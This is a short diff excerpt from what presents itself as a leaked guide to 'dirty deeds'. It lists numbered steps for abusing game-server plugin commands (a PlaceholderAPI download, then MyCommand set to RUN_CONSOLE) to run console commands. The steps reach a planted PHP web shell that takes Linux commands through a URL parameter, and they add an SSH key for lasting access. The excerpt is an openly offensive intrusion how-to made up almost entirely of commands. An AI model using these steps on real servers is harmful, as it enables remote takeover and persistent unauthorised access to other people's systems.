@@ -95,6 +95,7 @@ I decided to leak this to you so that I can finally leave these dirty deeds behi
    5) open the site by digital IP of the server with the name of the created file, example: http://127.0.0.1:80/lmao.php?e=LINUX-COMMAND
 
     [for create a ssh key]
+   0) /papi ecloud download Unicode
    1) /mycmd-edit lmao command /lmao    
    2) /mycmd-edit lmao type RUN_CONSOLE
    3.1) On your Windows pc, open PowerShell -> ssh-keygen -t ed25519 -C "lmao" & cat ~/.ssh/id_ed25519.pub
